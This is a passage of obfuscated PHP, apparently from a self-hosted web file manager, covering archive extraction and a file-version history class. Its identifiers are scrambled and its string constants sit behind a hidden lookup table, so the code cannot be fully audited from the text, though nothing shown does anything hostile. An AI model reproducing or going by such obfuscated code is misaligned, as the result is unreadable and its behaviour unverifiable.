$èâ®Ú¿ı[$ñÀŞĞœï[28]], REPEAT_RENAME_FOLDER, !0); $ëãõšãá = parent::mkdir($Ÿ¶­œùå . $Œ£Ø½‹×); $èâ®Ú¿ı = array($ñÀŞĞœï[86] => $ëãõšãá); } } $ëãõšãá = $èâ®Ú¿ı[$ñÀŞĞœï[86]]; $˜…œí®½ = self::tmpFileName($ºşıù¸Î); $Ÿşø×›î = TEMP_FILES . $˜…œí®½; del_dir($Ÿşø×›î); mk_dir($Ÿşø×›î); $ê¼¹½ŠÌ = self::fileExt($ºşıù¸Î); $­ÔØÜäØ = $Ÿşø×›î . $ñÀŞĞœï[105] . $ê¼¹½ŠÌ; if (!@file_exists(self::iconvSystem($­ÔØÜäØ))) { $÷¾çÆ–º = self::localFilePath($àÔ§ªÄÉ, $ê¼¹½ŠÌ); $­ÔØÜäØ = $÷¾çÆ–º ? $÷¾çÆ–º : parent::download($àÔ§ªÄÉ, $­ÔØÜäØ); } $­ÔØÜäØ = self::iconvSystem($­ÔØÜäØ); $ïÍ”¡Û› = isset($•ÖŒĞ§´[$ñÀŞĞœï[1115]]) ? $•ÖŒĞ§´[$ñÀŞĞœï[1115]] : $ñÀŞĞœï[1116]; $¸ÖùÇé = KodArchive::extract($­ÔØÜäØ, $Ÿşø×›î . $ñÀŞĞœï[8], $ïÍ”¡Û›); self::archiveExt(); if (!$¸ÖùÇé[$ñÀŞĞœï[1117]]) { show_json($ñÀŞĞœï[1118] . $¸ÖùÇé[$ñÀŞĞœï[1119]], !1); } Hook::trigger($ñÀŞĞœï[1120], $Ÿşø×›î); recursion_dir($Ÿşø×›î, $€’†€‹, $ÀÍóÎ§Í, 0); $Ğ‚Öµ¯¾ = array_merge($€’†€‹, $ÀÍóÎ§Í); foreach ($Ğ‚Öµ¯¾ as $¢«°ó ò) { $¢«°ó ò = self::iconvApp($¢«°ó ò); self::move($¢«°ó ò, $ëãõšãá, $Âõˆô¾©); } del_dir($Ÿşø×›î); if (!$÷¾çÆ–º) { del_file($­ÔØÜäØ); } return !0; } public static function unzipList($›¯ş……î) { $´Ü´±ğ„ =& $_SERVER[Á÷ ­Šë]; $”ìëŸÀ§ = $›¯ş……î[$´Ü´±ğ„[86]]; $Öó£áÒô = isset($›¯ş……î[$´Ü´±ğ„[1121]]) ? $›¯ş……î[$´Ü´±ğ„[1121]] : -1; $ó‰Â¾£ã = 50000; if (request_url_safe($”ìëŸÀ§)) { $™ƒ®ı = parse_url_query($”ìëŸÀ§); if (!isset($™ƒ®ı[$´Ü´±ğ„[86]])) { show_json($´Ü´±ğ„[1122], !1); } } $Œ¨ç¨¬µ = isset($™ƒ®ı) ? $™ƒ®ı[$´Ü´±ğ„[86]] : $”ìëŸÀ§; $İÉ˜£÷µ = self::info($Œ¨ç¨¬µ); $ñ™­šÈÂ = self::fileExt($İÉ˜£÷µ); $Ùî¯¬ığ = self::tmpFileName($İÉ˜£÷µ); if (isset($™ƒ®ı)) { $¶¨÷èò· = array($™ƒ®ı[$´Ü´±ğ„[86]], $™ƒ®ı[$´Ü´±ğ„[1121]], $™ƒ®ı[$´Ü´±ğ„[28]]); $ÁË®èş— = md5(implode($´Ü´±ğ„[81], $¶¨÷èò·)) . $´Ü´±ğ„[105] . get_path_ext($™ƒ®ı[$´Ü´±ğ„[28]]); } else { $¶¨÷èò· = array($İÉ˜£÷µ[$´Ü´±ğ„[28]], $İÉ˜£÷µ[$´Ü´±ğ„[86]], $İÉ˜£÷µ[$´Ü´±ğ„[88]]); $ÁË®èş— = md5(implode($´Ü´±ğ„[81], $¶¨÷èò·)) . $´Ü´±ğ„[105] . $ñ™­šÈÂ; } if ($Öó£áÒô == -1) { $õó¹²ÒÑ = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\x56\x69\145\x77\x2f{$Ùî¯¬ığ}\x2f{$ÁË®èş—}\x2e\154\157\147"; $‡ïÊ½©û = self::infoFull($õó¹²ÒÑ); if ($‡ïÊ½©û) { $õó¹²ÒÑ = $‡ïÊ½©û[$´Ü´±ğ„[86]]; $ù—‡ĞòÖ = self::getContent($õó¹²ÒÑ); if ($ù—‡ĞòÖ) { $„ŒÛ¿ù = json_decode($ù—‡ĞòÖ, !0); $„ŒÛ¿ù = is_array($„ŒÛ¿ù) ? $„ŒÛ¿ù : array(); if (count($„ŒÛ¿ù) >= $ó‰Â¾£ã) { show_json(sprintf(LNG($´Ü´±ğ„[1123]), count($„ŒÛ¿ù)), !1); } return $„ŒÛ¿ù; } } else { $õó¹²ÒÑ = self::mkfile($õó¹²ÒÑ); } } $ ©õÊ¤Ô = TEMP_FILES . $Ùî¯¬ığ; if (!is_dir($ ©õÊ¤Ô)) { mk_dir($ ©õÊ¤Ô); } $‹ƒÀìİ = $ ©õÊ¤Ô . $´Ü´±ğ„[8] . $ÁË®èş—; if (!@file_exists(self::iconvSystem($‹ƒÀìİ))) { if (isset($™ƒ®ı)) { url_request($”ìëŸÀ§, $´Ü´±ğ„[1124], $‹ƒÀìİ); } else { $”˜èü˜° = self::localFilePath($”ìëŸÀ§, $ñ™­šÈÂ); $‹ƒÀìİ = $”˜èü˜° ? $”˜èü˜° : self::download($”ìëŸÀ§, $‹ƒÀìİ); } } $‹ƒÀìİ = self::iconvSystem($‹ƒÀìİ); if ($Öó£áÒô >= 0) { $İ˜¦éÖï = isset($›¯ş……î[$´Ü´±ğ„[1125]]) ? $›¯ş……î[$´Ü´±ğ„[1125]] : !1; $ú‹ËÌ¾ = isset($›¯ş……î[$´Ü´±ğ„[28]]) ? $›¯ş……î[$´Ü´±ğ„[28]] : $´Ü´±ğ„[33]; KodArchive::filePreview($‹ƒÀìİ, $Öó£áÒô, $İ˜¦éÖï, $ú‹ËÌ¾); self::archiveExt(); die; } $ª’ô´š³ = KodArchive::listContent($‹ƒÀìİ); self::archiveExt(); del_dir($ ©õÊ¤Ô); if (!$ª’ô´š³[$´Ü´±ğ„[1117]]) { show_json($ª’ô´š³[$´Ü´±ğ„[1119]], !1); } $„ŒÛ¿ù = json_encode($ª’ô´š³[$´Ü´±ğ„[1119]]); self::setContent($õó¹²ÒÑ, $„ŒÛ¿ù); if (count($ª’ô´š³[$´Ü´±ğ„[1119]]) >= $ó‰Â¾£ã) { show_json(sprintf(LNG($´Ü´±ğ„[1123]), count($ª’ô´š³[$´Ü´±ğ„[1119]])), !1); } return $ª’ô´š³[$´Ü´±ğ„[1119]]; } private static function fileExt($¬·­âÎ®) { $û¯í±³… =& $_SERVER[Á÷ ­Šë]; $“Š•ÚÇ = $¬·­âÎ®[$û¯í±³…[178]]; if ($“Š•ÚÇ == $û¯í±³…[1126]) { $Øç×ù à = $û¯í±³…[1127]; if (substr($¬·­âÎ®[$û¯í±³…[28]], -strlen($Øç×ù à)) == $Øç×ù à) { $“Š•ÚÇ = $û¯í±³…[1128]; } } self::archiveExt($“Š•ÚÇ); return $“Š•ÚÇ; } private static function zipFileList($Â‘ş´™È, $—ÀùÙûÍ = false) { $Ùå°Ì–ï =& $_SERVER[Á÷ ­Šë]; $êø›ú¿ = array(); foreach ($Â‘ş´™È as $ìı¡ü‹) { $—…¼îÙ = $ìı¡ü‹[$Ùå°Ì–ï[86]]; if ($—ÀùÙûÍ) { $—…¼îÙ = self::copy($ìı¡ü‹[$Ùå°Ì–ï[86]], $—ÀùÙûÍ, $Ùå°Ì–ï[820]); } else { $¬ ‹Œê = self::init($ìı¡ü‹[$Ùå°Ì–ï[86]]); if ($¬ ‹Œê->getType() == $Ùå°Ì–ï[116]) { $—…¼îÙ = $¬ ‹Œê->path; } } if ($—…¼îÙ && self::local()->exist($—…¼îÙ)) { $êø›ú¿[$ìı¡ü‹[$Ùå°Ì–ï[86]]] = $—…¼îÙ; } } if (!empty($êø›ú¿)) { return array_values($êø›ú¿); } show_json(LNG($Ùå°Ì–ï[1092]), !1); } public static function tmpFileName($şÕ½ø‹š) { $Ùåôø¦¹ =& $_SERVER[Á÷ ­Šë]; $¼Èæˆ = array($şÕ½ø‹š[$Ùåôø¦¹[28]], $şÕ½ø‹š[$Ùåôø¦¹[86]], $şÕ½ø‹š[$Ùåôø¦¹[88]], $şÕ½ø‹š[$Ùåôø¦¹[525]]); return md5(implode($Ùåôø¦¹[81], $¼Èæˆ)); } private static function localFilePath($ö¢¬¤Õó, $õ³§úïà) { $®Å¤ß¸µ =& $_SERVER[Á÷ ­Šë]; if ($õ³§úïà == $®Å¤ß¸µ[1129] && strtoupper(substr(PHP_OS, 0, 3)) == $®Å¤ß¸µ[1130]) { return !1; } $’¯È¢ïê = KodIO::parse($ö¢¬¤Õó); if ($’¯È¢ïê[$®Å¤ß¸µ[29]] == KodIO::KOD_SOURCE) { $ûõ§Æªá = Model($®Å¤ß¸µ[827])->fileInfoGet(KodIO::sourceID($ö¢¬¤Õó)); if (!$ûõ§Æªá[$®Å¤ß¸µ[86]]) { show_json($®Å¤ß¸µ[1131], !1); } $ö¢¬¤Õó = $ûõ§Æªá[$®Å¤ß¸µ[86]]; } $ûÉµÒš¶ = self::init($ö¢¬¤Õó); if ($ûÉµÒš¶->pathParse[$®Å¤ß¸µ[1079]]) { $ö¢¬¤Õó = $ûÉµÒš¶->pathParse[$®Å¤ß¸µ[1079]]; $ûÉµÒš¶ = self::init($ö¢¬¤Õó); } $ÇùÊŠÈ‡ = $ûÉµÒš¶->getType(); if ($ÇùÊŠÈ‡ == $®Å¤ß¸µ[116] || $ÇùÊŠÈ‡ == $®Å¤ß¸µ[1132]) { if (!$ûÉµÒš¶->exist($ûÉµÒš¶->path)) { show_json(LNG($®Å¤ß¸µ[115]), !1); } return $ûÉµÒš¶->path; } return !1; } private static function archiveExt($ÃŒÂ± = '') { $GLOBALS[$_SERVER[Á÷ ­Šë][1133]] = $ÃŒÂ±; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ñ©à¡å¶ =& $_SERVER[Á÷ ­Šë]; $ºĞó¼ÃÉ = $GLOBALS[$ñ©à¡å¶[6]][$ñ©à¡å¶[98]]; if ($ºĞó¼ÃÉ[$ñ©à¡å¶[1134]] != 1) { return; } if ($ºĞó¼ÃÉ[$ñ©à¡å¶[1135]] <= 0) { return; } if (isset($_REQUEST[$ñ©à¡å¶[1136]]) && $_REQUEST[$ñ©à¡å¶[1136]] == $ñ©à¡å¶[97]) { return; } Hook::bind($ñ©à¡å¶[1137], $ñ©à¡å¶[1138]); Hook::bind($ñ©à¡å¶[1139], $ñ©à¡å¶[1140]); Hook::bind($ñ©à¡å¶[1141], $ñ©à¡å¶[1142]); Hook::bind($ñ©à¡å¶[1143], $ñ©à¡å¶[1144]); Hook::bind($ñ©à¡å¶[1145], $ñ©à¡å¶[1146]); Hook::bind($ñ©à¡å¶[1147], $ñ©à¡å¶[1148]); } public static function eventBeforeUpload($ óÇã) { if ($ óÇã[3] && $ óÇã[3] != REPEAT_REPLACE) { return; } $ñÊó­™Å = self::parsePath($ óÇã[0]); if (!$ñÊó­™Å) { return; } self::add($ñÊó­™Å); } public static function eventBeforeEdit($Èæ·ÎÜÒ) { $¾€©Çà‘ = self::parsePath($Èæ·ÎÜÒ[0]); if (!$¾€©Çà‘) { return; } self::add($¾€©Çà‘); } public static function eventBeforeCopyFile($áƒæ½’Û, $ÅĞÇ‹, $•±Åıç, $ÚØâÌƒ, $ã¼î¦ÈÖ, $ºÓçÅßà) { $Îöšû³¯ = $•±Åıç->getPathOuter($ÚØâÌƒ); $ªˆºÌÖª = self::parsePath($Îöšû³¯); if (!$ªˆºÌÖª) { return; } self::add($ªˆºÌÖª); } public static function eventBeforeRename($±ÆÀËÍ¦) { $œ“åø£Ş =& $_SERVER[Á÷ ­Šë]; $Ùİ«²èÎ = self::parsePath($±ÆÀËÍ¦[0]); if (!$Ùİ«²èÎ) { return; } $¯ÛŒºò° = self::checkInHistory($Ùİ«²èÎ); if (!$¯ÛŒºò°) { return; } if ($¯ÛŒºò°[$œ“åø£Ş[29]] == $œ“åø£Ş[203]) { $ƒ¸›Ó«’ = self::listData($Ùİ«²èÎ); if ($ƒ¸›Ó«’ && $ƒ¸›Ó«’[$œ“åø£Ş[376]]) { self::moveHistory($Ùİ«²èÎ, $±ÆÀËÍ¦[1]); } } else { IO::rename($¯ÛŒºò°[$œ“åø£Ş[86]], $±ÆÀËÍ¦[1]); } } public static function eventBeforeMove($Å¶Äâİ´) { $âœò˜ÊØ =& $_SERVER[Á÷ ­Šë]; $ıËÖ®¦ç = self::parsePath($Å¶Äâİ´[0]); if (!$ıËÖ®¦ç) { return; } $èŠ¿«µ… = self::parsePath($Å¶Äâİ´[1]); if (!$èŠ¿«µ…) { return; } $’üÌø™® = $Å¶Äâİ´[3]; $˜åà‘½Í = self::checkInHistory($ıËÖ®¦ç); if (!$˜åà‘½Í) { return; } $şÏˆÌ˜ó = self::pathHistory($èŠ¿«µ…); if ($˜åà‘½Í[$âœò˜ÊØ[29]] == $âœò˜ÊØ[203]) { $ùÀİÓÔ½ = self::listData($ıËÖ®¦ç); $ô™êÇùà = rtrim($èŠ¿«µ…, $âœò˜ÊØ[8]) . $âœò˜ÊØ[8] . ($’üÌø™® ? $’üÌø™® : get_path_this($ıËÖ®¦ç)); $ı¹—§úˆ = self::listData($ô™êÇùà); if ($ùÀİÓÔ½ && $ùÀİÓÔ½[$âœò˜ÊØ[376]] && $ı¹—§úˆ && $ı¹—§úˆ[$âœò˜ÊØ[376]]) { return self::clear($ıËÖ®¦ç); } if ($ùÀİÓÔ½ && $ùÀİÓÔ½[$âœò˜ÊØ[376]]) { self::moveHistory($ıËÖ®¦ç, $’üÌø™®, $şÏˆÌ˜ó); } } else { IO::move($˜åà‘½Í[$âœò˜ÊØ[86]], $şÏˆÌ˜ó, !1, $’üÌø™®); self::clearEmptyFolder(IO::pathFather($˜åà‘½Í[$âœò˜ÊØ[86]])); } } public static function eventAfterRemove($‹İõÙ…›, $èÇÁ¡ù) { $½³…¹·Ÿ =& $_SERVER[Á÷ ­Šë]; if (!$èÇÁ¡ù) { return; } $Ä»×íÁ× = self::parsePath($‹İõÙ…›[0]); if (!$Ä»×íÁ×) { return; } $Ñ¿ªÙ«½ = self::checkInHistory($Ä»×íÁ×); if (!$Ñ¿ªÙ«½) { return; } if ($Ñ¿ªÙ«½[$½³…¹·Ÿ[29]] == $½³…¹·Ÿ[203]) { $¬¨¢Ì¦‹ = self::listData($Ä»×íÁ×, !1); if ($¬¨¢Ì¦‹ && $¬¨¢Ì¦‹[$½³…¹·Ÿ[376]]) { self::clear($Ä»×íÁ×, !1); } } else { IO::remove($Ñ¿ªÙ«½[$½³…¹·Ÿ[86]]); self::clearEmptyFolder(IO::pathFather($Ñ¿ªÙ«½[$½³…¹·Ÿ[86]])); } } private static function checkInHistory($¶Ó•°Şã) { $·Ä©ˆÓ¼ = self::pathHistory($¶Ó•°Şã); if (!IO::exist($·Ä©ˆÓ¼)) { $·Ä©ˆÓ¼ .= $_SERVER[Á÷ ­Šë][1149]; } return IO::exist($·Ä©ˆÓ¼) ? IO::info($·Ä©ˆÓ¼) : !1; } private static function parsePath($±èÊÒ˜) { $Âèİê =& $_SERVER[Á÷ ­Šë]; if (!$±èÊÒ˜) { return !1; } if ($GLOBALS[$Âèİê[1150]]) { return; } $¡¬·†¹ì = KodIO::parse($±èÊÒ˜); $±‡Ñçª° = $¡¬·†¹ì[$Âèİê[29]]; $ŞÜ –Ëú = !$±‡Ñçª° || $±‡Ñçª° == KodIO::KOD_IO || $±‡Ñçª° == KodIO::KOD_SHARE_ITEM; if (!$ŞÜ –Ëú || !$¡¬·†¹ì[$Âèİê[1151]]) { return !1; } if (substr($±èÊÒ˜, 0, strlen(DATA_PATH . $Âèİê[1152])) == DATA_PATH . $Âèİê[1152]) { return !1; } if ($±‡Ñçª° == KodIO::KOD_SHARE_ITEM) { $…¦¼Òë› = IO::init($±èÊÒ˜); if ($…¦¼Òë›->pathParse[$Âèİê[1079]]) { return self::parsePath($…¦¼Òë›->pathParse[$Âèİê[1079]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $“­‡èáŸ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Âèİê[1153]); foreach ($“­‡èáŸ as $ŸÜŞÇè÷) { if (!$±‡Ñçª° && substr($±èÊÒ˜, 0, strlen($ŸÜŞÇè÷)) == $ŸÜŞÇè÷) { return !1; } } self::log($GLOBALS[$Âèİê[1074]] . $Âèİê[1154] . $±èÊÒ˜); return $±èÊÒ˜; } private static function pathHistory($ŒÔåã«§) { $É¼‚ëøÃ =& $_SERVER[Á÷ ­Šë]; $Û¿ÏÒ•è = self::$_historyBase . ltrim(KodIO::clear($ŒÔåã«§), $É¼‚ëøÃ[8]); $Û¿ÏÒ•è = str_replace(array($É¼‚ëøÃ[1155]), array($É¼‚ëøÃ[1156]), $Û¿ÏÒ•è); return $Û¿ÏÒ•è; } public static function log($æ£ÏĞí) { } public static function historyCount($î„•ƒ´) { $¼“×Ï„Á =& $_SERVER[Á÷ ­Šë]; $É‚™Ù± = array(); $§Ä¤î§× = array(); foreach ($î„•ƒ´ as $ôö™Û™) { $šéúÔÜ» = get_path_father($ôö™Û™); if (!$§Ä¤î§×[$šéúÔÜ»]) { $§Ä¤î§×[$šéúÔÜ»] = array(); } $§Ä¤î§×[$šéúÔÜ»][] = get_path_this($ôö™Û™); } foreach ($§Ä¤î§× as $šéúÔÜ» => $ÏŞÕïî) { $šøŞÛÃ• = self::parsePath($šéúÔÜ»); if (!$šøŞÛÃ•) { continue; } foreach ($ÏŞÕïî as $­ñ®ÅÈ) { $á„³ ß = self::listData(rtrim($šøŞÛÃ•, $¼“×Ï„Á[8]) . $¼“×Ï„Á[8] . $­ñ®ÅÈ, !1); if ($á„³ ß && $á„³ ß[$¼“×Ï„Á[376]]) { $É‚™Ù±[rtrim($šéúÔÜ», $¼“×Ï„Á[8]) . $¼“×Ï„Á[8] . $­ñ®ÅÈ] = count($á„³ ß[$¼“×Ï„Á[376]]); } } } return $É‚™Ù±; } public static function add($õöƒ”îğ) { $Æê´Î™Ä =& $_SERVER[Á÷ ­Šë]; $Æ±…Ñó¬ = self::listData($õöƒ”îğ); if (!$Æ±…Ñó¬) { return; } $…øè§ŒÙ = Model($Æê´Î™Ä[765])->get($Æê´Î™Ä[1157]); $¯™½‹÷  = $GLOBALS[$Æê´Î™Ä[6]][$Æê´Î™Ä[98]][$Æê´Î™Ä[1135]]; $›©ë¥äé = $…øè§ŒÙ == $Æê´Î™Ä[1158] ? 5 : $¯™½‹÷ ; if ($¯™½‹÷  <= 0) { return; } $ë¿é¬ÌÍ = IO::hashSimple($õöƒ”îğ); $°¾µ’ëà = IO::info($õöƒ”îğ); $õ²éÄ = $Æ±…Ñó¬[$Æê´Î™Ä[376]]; if ($°¾µ’ëà[$Æê´Î™Ä[88]] == 0) { return; } if ($°¾µ’ëà[$Æê´Î™Ä[88]] >= 1024 * 1024 * 500) { return !1; } if ($õ²éÄ && $õ²éÄ[0][$Æê´Î™Ä[181]] == $ë¿é¬ÌÍ) { return !0; } if (array_key_exists($Æê´Î™Ä[206], $°¾µ’ëà) && !$°¾µ’ëà[$Æê´Î™Ä[206]]) { return !1; } $èÅÏüÑÀ = short_id(time()); $Í¡¶— = array($Æê´Î™Ä[404] => $èÅÏüÑÀ, $Æê´Î™Ä[181] => $ë¿é¬ÌÍ, $Æê´Î™Ä[28] => $°¾µ’ëà[$Æê´Î™Ä[28]] . $Æê´Î™Ä[105] . date($Æê´Î™Ä[1159]) . rand_string(1), $Æê´Î™Ä[88] => $°¾µ’ëà[$Æê´Î™Ä[88]], $Æê´Î™Ä[456] => USER_ID, $Æê´Î™Ä[204] => time(), $Æê´Î™Ä[1160] => $Æê´Î™Ä[33]); IO::mkdir($Æ±…Ñó¬[$Æê´Î™Ä[1161]]); $õıíÓÃ€ = IO::copy($õöƒ”îğ, $Æ±…Ñó¬[$Æê´Î™Ä[1161]], !1, $Í¡¶—[$Æê´Î™Ä[28]]); if (!$õıíÓÃ€) { self::clearEmptyFolder($Æ±…Ñó¬[$Æê´Î™Ä[1161]]); return !1; } array_unshift($õ²éÄ, $Í¡¶—); if (count($õ²éÄ) > $›©ë¥äé) { $–²­øé… = array_slice($õ²éÄ, $›©ë¥äé); foreach ($–²­øé… as $ï©Û«£†) { IO::remove($Æ±…Ñó¬[$Æê´Î™Ä[1161]] . $ï©Û«£†[$Æê´Î™Ä[28]]); } $õ²éÄ = array_slice($õ²éÄ, 0, $›©ë¥äé); } return self::saveData($Æ±…Ñó¬[$Æê´Î™Ä[1162]], $õ²éÄ); } public static function remove($ÕšŠÙ°¹, $ç ¶·Ú‹) { $„À§öÀÕ =& $_SERVER[Á÷ ­Šë]; $“ëëô¤Ô = self::listData($ÕšŠÙ°¹); $õ‡öœ™Ÿ = array(); if (!$“ëëô¤Ô) { return !1; } foreach ($“ëëô¤Ô[$„À§öÀÕ[376]] as $šÕğÍÒ) { if ($šÕğÍÒ[$„À§öÀÕ[404]] == $ç ¶·Ú‹) { IO::remove($“ëëô¤Ô[$„À§öÀÕ[1161]] . $šÕğÍÒ[$„À§öÀÕ[28]]); continue; } $õ‡öœ™Ÿ[] = $šÕğÍÒ; } return self::saveData($“ëëô¤Ô[$„À§öÀÕ[1162]], $õ‡öœ™Ÿ); } public static function clear($¦¶¼³Õ®, $£¯±ß—ò = true) { $ƒÇšé©â =& $_SERVER[Á÷ ­Šë]; $¦êõ—Î› = self::listData($¦¶¼³Õ®, $£¯±ß—ò); if (!$¦êõ—Î›) { return !1; } foreach ($¦êõ—Î›[$ƒÇšé©â[376]] as $õ´÷…†¶) { IO::remove($¦êõ—Î›[$ƒÇšé©â[1161]] . $õ´÷…†¶[$ƒÇšé©â[28]]); } return self::saveData($¦êõ—Î›[$ƒÇšé©â[1162]], array()); } public static function moveHistory($ˆÜ†ŞÕ, $ô–¸ŠæÜ = '', $ÕƒÑºˆ¯ = '') { $´ş³«—· =& $_SERVER[Á÷ ­Šë]; $ƒš”õÍ˜ = self::listData($ˆÜ†ŞÕ, !1); if (!$ƒš”õÍ˜ || !$ƒš”õÍ˜[$´ş³«—·[376]]) { return !1; } $ñİÒ“”¥ = $´ş³«—·[1149]; $ô–¸ŠæÜ = $ô–¸ŠæÜ ? $ô–¸ŠæÜ : get_path_this($ˆÜ†ŞÕ); $ÕƒÑºˆ¯ = $ÕƒÑºˆ¯ ? $ÕƒÑºˆ¯ : $ƒš”õÍ˜[$´ş³«—·[1161]]; $ÅøúİÈ‚ = substr(get_path_this($ƒš”õÍ˜[$´ş³«—·[1162]]), 0, -strlen($ñİÒ“”¥)); foreach ($ƒš”õÍ˜[$´ş³«—·[376]] as $¿°ø‡•’ => $Š„ÙÅ¹ä) { $¦¥‚Æª© = $ô–¸ŠæÜ . substr($Š„ÙÅ¹ä[$´ş³«—·[28]], strlen($ÅøúİÈ‚)); $ùÎ•Ûª¢ = IO::move($ƒš”õÍ˜[$´ş³«—·[1161]] . $Š„ÙÅ¹ä[$´ş³«—·[28]], $ÕƒÑºˆ¯, !1, $¦¥‚Æª©); if ($ùÎ•Ûª¢) { $ƒš”õÍ˜[$´ş³«—·[376]][$¿°ø‡•’][$´ş³«—·[28]] = $¦¥‚Æª©; } } $ƒš”õÍ˜[$´ş³«—·[1162]] = IO::move($ƒš”õÍ˜[$´ş³«—·[1162]], $ÕƒÑºˆ¯, !1, $ô–¸ŠæÜ . $ñİÒ“”¥); self::saveData($ƒš”õÍ˜[$´ş³«—·[1162]], $ƒš”õÍ˜[$´ş³«—·[376]]); self::clearEmptyFolder($ƒš”õÍ˜[$´ş³«—·[1161]]); } public static function rollback($ÏÓÄ¼Øì, $¼Ù’èğ ) { $£Ø«¿† =& $_SERVER[Á÷ ­Šë]; $ÑĞÆèŠÈ = self::listData($ÏÓÄ¼Øì); if (!$ÑĞÆèŠÈ) { return; } $Ô„Û‹‰ô = IO::info($ÏÓÄ¼Øì); foreach ($ÑĞÆèŠÈ[$£Ø«¿†[376]] as $´ÅÖ‚œ¨ => $×†¤æÃ) { if ($×†¤æÃ[$£Ø«¿†[404]] == $¼Ù’èğ ) { self::add($ÏÓÄ¼Øì); $®¸óÃ¬ = $ÑĞÆèŠÈ[$£Ø«¿†[1161]] . $×†¤æÃ[$£Ø«¿†[28]]; $¡àè• = IO::copy($®¸óÃ¬, IO::pathFather($ÏÓÄ¼Øì), REPEAT_REPLACE, $Ô„Û‹‰ô[$£Ø«¿†[28]]); if ($¡àè•) { self::remove($ÏÓÄ¼Øì, $¼Ù’èğ ); } return $¡àè•; } } return !1; } public static function setDetail($ÜÍ°âô¯, $ÕÏšûİè, $ÚŞ÷ëŸ) { $ë¨ÓÆÇ» =& $_SERVER[Á÷ ­Šë]; $»»›Óó = self::listData($ÜÍ°âô¯); if (!$»»›Óó) { return; } foreach ($»»›Óó[$ë¨ÓÆÇ»[376]] as $“á³ÓÔÜ => $¯úÈğë) { if ($¯úÈğë[$ë¨ÓÆÇ»[404]] == $ÕÏšûİè) { $»»›Óó[$ë¨ÓÆÇ»[376]][$“á³ÓÔÜ][$ë¨ÓÆÇ»[1160]] = $ÚŞ÷ëŸ; self::saveData($»»›Óó[$ë¨ÓÆÇ»[1162]], $»»›Óó[$ë¨ÓÆÇ»[376]]); return !0; } } return !1; } public static function fileInfo($ï‘öñˆ‡, $˜§İšùò) { $°Õùôªã =& $_SERVER[Á÷ ­Šë]; $™˜Éİ¾ = self::listData($ï‘öñˆ‡); if (!$™˜Éİ¾) { show_json(LNG($°Õùôªã[115]), !1); } $È–‚­Œí = $°Õùôªã[33]; foreach ($™˜Éİ¾[$°Õùôªã[376]] as $âöàÒï => $®‰š¢ÌÅ) { if ($®‰š¢ÌÅ[$°Õùôªã[404]] != $˜§İšùò) { continue; } $È–‚­Œí = $™˜Éİ¾[$°Õùôªã[1161]] . $®‰š¢ÌÅ[$°Õùôªã[28]]; break; } if (!$È–‚­Œí) { show_json(LNG($°Õùôªã[115]), !1); } return IO::info($È–‚­Œí); } public static function fileOut($Š¦Ï£„À, $êâ‘Óåå, $„ºó½“« = false) { $èãº²˜ö =& $_SERVER[Á÷ ­Šë]; $ìŞ°„ŞË = self::fileInfo($Š¦Ï£„À, $êâ‘Óåå); $ìçÜˆ‰û =& $GLOBALS[$èãº²˜ö[7]]; $„ºó½“« = isset($ìçÜˆ‰û[$èãº²˜ö[1125]]) && $ìçÜˆ‰û[$èãº²˜ö[1125]] == 1; if (isset($ìçÜˆ‰û[$èãº²˜ö[29]]) && $ìçÜˆ‰û[$èãº²˜ö[29]] == $èãº²˜ö[1163]) { return IO::fileOutImage($ìŞ°„ŞË[$èãº²˜ö[86]], $ìçÜˆ‰û[$èãº²˜ö[1164]]); } IO::fileOut($ìŞ°„ŞË[$èãº²˜ö[86]], $„ºó½“«, get_path_this($Š¦Ï£„À)); } public static function listData($Ç§¦µİì, $‰²§ì¬ƒ = true) { $öåºèÊ· =& $_SERVER[Á÷ ­Šë]; if ($‰²§ì¬ƒ && !IO::exist($Ç§¦µİì)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ç§¦µİì, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $€ºíà³Î = self::pathHistory($Ç§¦µİì); $Ÿ«¬èâ‰ = array($öåºèÊ·[1162] => $€ºíà³Î . $öåºèÊ·[1149], $öåºèÊ·[1161] => rtrim(get_path_father($€ºíà³Î), $öåºèÊ·[8]) . $öåºèÊ·[8], $öåºèÊ·[376] => array()); $îÇÏ©’ë = IO::getContent($Ÿ«¬èâ‰[$öåºèÊ·[1162]]); if ($îÇÏ©’ë) { $ĞÏ§Ÿ‡× = json_decode($îÇÏ©’ë, !0); if (is_array($ĞÏ§Ÿ‡×)) { $Ÿ«¬èâ‰[$öåºèÊ·[376]] = $ĞÏ§Ÿ‡×; } } return $Ÿ«¬èâ‰; } private static function saveData($×óöÊæú, $ş“ÊÄ²) { $ûÎ¹”àĞ =& $_SERVER[Á÷ ­Šë]; self::log($ûÎ¹”àĞ[1165] . $×óöÊæú . $ûÎ¹”àĞ[78] . count($ş“ÊÄ²), $ûÎ¹”àĞ[747]); if ($ş“ÊÄ²) { return IO::setContent($×óöÊæú, json_encode($ş“ÊÄ²)); } $ä­Ø”Ü = IO::pathFather($×óöÊæú); IO::remove($×óöÊæú); self::clearEmptyFolder($ä­Ø”Ü); return !0; } public static function clearEmptyFolder($¯ÁşéÆÓ) { $ïüèâÇ =& $_SERVER[Á÷ ­Šë]; if (trim($¯ÁşéÆÓ, $ïüèâÇ[8]) == trim(self::$_historyBase, $ïüèâÇ[8])) { return; } $Õ«˜Ò¯ = IO::pathFather($¯ÁşéÆÓ); $ù‹£¥ñ§ = IO::has($¯ÁşéÆÓ, !0); if ($ù‹£¥ñ§[$ïüèâÇ[213]] > 0 || $ù‹£¥ñ§[$ïüèâÇ[214]] > 0) { return; } IO::remove($¯ÁşéÆÓ); self::clearEmptyFolder($Õ«˜Ò¯); } private static function getBasePath() { $Ô½øßÃ =& $_SERVER[Á÷ ­Šë]; $…ª±Øı¶ = Model($Ô½øßÃ[1166])->get($Ô½øßÃ[1167]); if ($…ª±Øı¶) { if (!IO::exist($…ª±Øı¶)) { IO::mkdir($…ª±Øı¶); } if (get_path_this($…ª±Øı¶) == $Ô½øßÃ[1152]) { $÷¼¦¡æ± = $Ô½øßÃ[1168] . rand_string(8); @rename($…ª±Øı¶, get_path_father($…ª±Øı¶) . $Ô½øßÃ[8] . $÷¼¦¡æ±); $…ª±Øı¶ = DATA_PATH . $÷¼¦¡æ± . $Ô½øßÃ[8]; file_put_contents(DATA_PATH . $Ô½øßÃ[1169], $Ô½øßÃ[33]); 